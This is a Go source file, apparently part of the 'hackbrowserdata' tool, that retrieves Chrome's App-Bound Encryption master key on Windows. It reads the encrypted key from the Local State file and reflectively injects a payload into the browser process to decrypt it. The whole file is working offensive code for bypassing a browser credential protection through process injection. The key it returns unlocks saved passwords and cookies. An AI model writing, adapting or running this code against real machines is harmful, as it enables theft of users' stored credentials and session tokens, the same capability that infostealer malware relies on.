//go:build windows

package keyretriever

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/tidwall/gjson"

	"github.com/moond4rk/hackbrowserdata/crypto/windows/payload"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/injector"
	"github.com/moond4rk/hackbrowserdata/utils/winutil"
)

const envEncKeyB64 = "HBD_ABE_ENC_B64"

var appbPrefix = []byte{'A', 'P', 'P', 'B'}

var errNoABEKey = errors.New("abe: Local State has no app_bound_encrypted_key")

type ABERetriever struct{}

func (r *ABERetriever) RetrieveKey(hints Hints) ([]byte, error) {
	// Non-ABE forks (Opera/Vivaldi/Yandex) supply no WindowsABEKey — treat as "not applicable".
	// (Pre-v20 Chrome takes the errNoABEKey path below.)
	browserKey := strings.TrimSpace(hints.WindowsABEKey)
	if browserKey == "" {
		return nil, nil
	}

	encKey, err := loadEncryptedKey(hints.LocalStatePath)
	if errors.Is(err, errNoABEKey) {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	pl, err := payload.Get("amd64")
	if err != nil {
		return nil, fmt.Errorf("abe: %w", err)
	}

	exePath, err := winutil.ExecutablePath(browserKey)
	if err != nil {
		return nil, fmt.Errorf("abe: %w", err)
	}

	env := map[string]string{
		envEncKeyB64: base64.StdEncoding.EncodeToString(encKey),
	}

	inj := &injector.Reflective{}
	key, err := inj.Inject(exePath, pl, env)
	if err != nil {
		return nil, fmt.Errorf("abe: inject into %s: %w", exePath, err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("abe: unexpected key length %d (want 32)", len(key))
	}
	log.Infof("abe: retrieved %s master key via reflective injection", browserKey)
	return key, nil
}

func loadEncryptedKey(localStatePath string) ([]byte, error) {
	if localStatePath == "" {
		return nil, errNoABEKey
	}
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("abe: read Local State: %w", err)
	}

	raw := gjson.GetBytes(data, "os_crypt.app_bound_encrypted_key")
	if !raw.Exists() {
		return nil, errNoABEKey
	}

	decoded, err := base64.StdEncoding.DecodeString(raw.String())
	if err != nil {
		return nil, fmt.Errorf("abe: base64 decode: %w", err)
	}
	if len(decoded) <= len(appbPrefix) {
		return nil, fmt.Errorf("abe: encrypted key too short: %d bytes", len(decoded))
	}
	for i, b := range appbPrefix {
		if decoded[i] != b {
			return nil, fmt.Errorf("abe: unexpected prefix: got %q, want %q",
				decoded[:len(appbPrefix)], appbPrefix)
		}
	}
	return decoded[len(appbPrefix):], nil
}
